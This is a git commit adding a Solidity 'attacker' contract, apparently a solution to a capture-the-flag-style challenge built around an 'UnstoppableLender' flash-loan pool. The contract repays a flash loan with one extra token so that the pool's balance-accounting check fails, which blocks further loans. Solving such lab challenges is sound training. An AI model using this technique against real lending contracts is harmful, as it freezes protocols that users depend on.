3c90d726ee0abdf0f3fd75f6d5e0a23cf8460030
theNvN <thenvnsahu@gmail.com>
2022-03-14 00:09:25 +0530

    attacker contract

---
+++ contracts/attacker-contracts/AttackerReceiverUnstoppable.sol
@@ -0,0 +1,35 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "../unstoppable/UnstoppableLender.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+/**
+ * @title AttackerReceiverUnstoppable
+ * @author Naveen Sahu
+ */
+contract AttackerReceiverUnstoppable {
+    UnstoppableLender private immutable pool;
+    address private immutable owner;
+
+    constructor(address poolAddress) {
+        pool = UnstoppableLender(poolAddress);
+        owner = msg.sender;
+    }
+
+    // Pool will call this function during the flash loan
+    function receiveTokens(address tokenAddress, uint256 amount) external {
+        require(msg.sender == address(pool), "Sender must be pool");
+        // Return all plus one extra token to the pool, which will break the accounting check in pool contract
+        require(
+            IERC20(tokenAddress).transfer(msg.sender, amount + 1),
+            "Transfer of tokens failed"
+        );
+    }
+
+    function executeFlashLoan(uint256 amount) external {
+        require(msg.sender == owner, "Only owner can execute flash loan");
+        pool.flashLoan(amount);
+    }
+}
